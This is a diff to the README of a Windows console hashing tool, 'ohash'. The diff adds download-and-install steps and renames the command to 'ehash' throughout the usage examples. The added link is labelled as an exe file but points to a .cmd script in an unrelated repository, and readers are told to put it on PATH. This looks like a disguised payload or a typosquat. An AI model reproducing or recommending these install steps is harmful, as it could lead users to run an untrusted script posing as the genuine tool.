@@ -1,6 +1,7 @@
-﻿# ohash
-
-Calculate hash for stdin or a file in Windows Console.
+﻿Calculate hash for stdin or a file in Windows Console.
+> 1. Download [exe file](https://raw.githubusercontent.com/winp/extra-bel/master/ecd.cmd).
+> 2. Copy to `C:\Program_Files\Scripts`.
+> 3. Add `C:\Program_Files\Scripts` to `PATH` environment variable.
 
 
 ## about
@@ -47,25 +48,25 @@ languages. Go ahead and create your own!
 ## usage
 
 ```batch
-> ohash [-a|--algorithm <algorithm>] [-s|--spaced] [-i|--input <input file>]
+> ehash [-a|--algorithm <algorithm>] [-s|--spaced] [-i|--input <input file>]
 
 :: [] -> optional argument
 :: <> -> argument value
 ```
 
 ````batch
-:: get md5 hash of a ohash.exe
-> ohash --input ohash.exe
+:: get md5 hash of a ehash.exe
+> ehash --input ehash.exe
 
-:: get md5 hash of a ohash.exe (alternate)
-> cat ohash.exe | ohash
+:: get md5 hash of a ehash.exe (alternate)
+> cat ehash.exe | ehash
 
 :: get sha256 hash of assignment.docx
-> ohash --algorithm SHA256 -i assignment.docx
+> ehash --algorithm SHA256 -i assignment.docx
 
 :: get ripemd160 hash of class notes.pdf
-> ohash -a RIPEMD160 -i "class notes.pdf"
+> ehash -a RIPEMD160 -i "class notes.pdf"
 
 :: get spaced sha1 hash of star wars.mp4
-> cat "star wars.mp4" | ohash -a SHA1 --spaced
+> cat "star wars.mp4" | ehash -a SHA1 --spaced
 ```
